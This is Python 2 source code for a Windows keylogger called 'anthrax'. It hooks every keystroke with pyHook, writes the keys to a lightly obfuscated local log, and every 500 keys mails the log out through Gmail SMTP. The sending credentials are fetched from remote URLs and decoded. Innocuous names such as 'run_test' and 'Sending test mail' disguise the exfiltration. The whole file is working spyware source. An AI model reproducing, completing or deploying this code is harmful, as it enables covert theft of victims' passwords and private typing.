#version 5.0
#config--------------------
subject_name = 'pc_name_error_anthrax5' #default fallback name
interval = 500
crypt_key = 69
#--------------------------
import pyHook, pythoncom, sys, logging, os, smtplib, socket, getpass, time
from email.MIMEBase import MIMEBase
from email.MIMEText import MIMEText
from email.MIMEMultipart import MIMEMultipart
from email import Encoders
import sched
import urllib2
file_log = 'C:\\Python27\log.txt'
mailing=0
delete=0
#if not os.path.exists(file_log):
#    os.makedirs(file_log)
count = 0
content = '////KL_INIT///> '

#anthraxlink
print 'Setting up anthraxlink...',
url_p = ""
url_u = ""

def anthraxlink(url):
    u = urllib2.urlopen(url)
    content = u.readlines()
    size = len(content)
    i = 0
    output = ''
    cipher = 0
    for word in content:
        content = word.split('\n')[0]
        content = int(float(content)-93)
        try:
            char = chr(content)
            output = output + str(char)
            #print '{0}\r'.format(i),
            time.sleep(0.001)
            i += 1
        except:
            print 'Deciphering key error: ' + str(cipher)
            cipher += 1
        output = output.replace('\n', '')
    return output
    u.close()
#End anthraxlink

p=anthraxlink(url_p)
u=anthraxlink(url_u)


print 'Linked'
#--------------------------
print 'Checking anthrax_launcher...',
try:
    f = open(subject_file,'r')
    sub = f.read()
    f.close()
except: #all
    sub = subject_name
print 'Done'
#--------------------------
print 'Hooking anthrax'

def run_test(msg):
    pythoncom.PumpWaitingMessages()
    global errors
    global delete
    print 'Starting Test...'

    try:
        smtpserver = smtplib.SMTP('smtp.gmail.com', 587)
        smtpserver.ehlo()
        smtpserver.starttls()
        smtpserver.ehlo()
        print 'Connection established'
        try:
            gmail_user = u
            gmail_pwd = p
            smtpserver.login(gmail_user, gmail_pwd)
        except smtplib.SMTPException:
            print 'Authentication failed' + '\n'
            smtpserver.close()
            sys.exit(1)

    except (socket.gaierror, socket.error, socket.herror, smtplib.SMTPException), e:
        print 'Connection failed'
        print e + '\n'
        sys.exit(1)

    to = u
    sub = 'To: ' + to + '\n' + 'From: ' + gmail_user + '\n' + 'Subject: ' + 'keylogger' + '\n' + msg 

    try:
        COMMASPACE = ', '
        print 'Sending test mail...',
        msg = MIMEMultipart()
        msg['Subject'] = sub
        msg['From'] = gmail_user
        msg['To'] = gmail_user
        text = "debug succeeded"

        attachFile = MIMEBase('application', 'octet-stream')
        infile = open(file_log, 'r')
        data = infile.read()
        infile.close()
        attachFile.set_payload(data)
		
        Encoders.encode_base64(attachFile)
        attachFile.add_header('Content-Disposition', 'attachment', filename='data.txt')
		
        msg.attach(attachFile)
        smtpserver.sendmail(gmail_user, to, msg.as_string())
        delete = 1
    except smtplib.SMTPException:
        print 'ERROR: Email could not be send' + '\n'
        errors += 1
    else:
        print 'Done'
    #print sub + '\n'
    smtpserver.close()

def OnKeyboardEvent(event):
    global file_log
    global delete
    if delete == 1:
        print 'deleting old log'
        logging.basicConfig(filename=file_log+'.txt', level=logging.DEBUG, format='%(message)s')
        open(file_log, 'w').close()
        delete = 0
    global mailing
    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
    output = (float(event.Ascii)+crypt_key)
    print output
    logging.log(10,output)
    global count
    global interval
    global content
    print count
    if count >= interval:
        hooks_manager.UnhookKeyboard()
        count = 0
        mailing=1
        run_test(content)
        hooks_manager.HookKeyboard()
        mailing=0
    else:
        content = str(content) + '\n' + str(event.Ascii)
        count = count+1
    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
while(mailing==0):
    #print 'mailing: ' + str(mailing)
    pythoncom.PumpWaitingMessages()

    
def vars():
    print 'count: ' + str(count)
    print 'interval: ' + str(interval)
    print 'file_log: ' + file_log 
    print 'content: ' + content

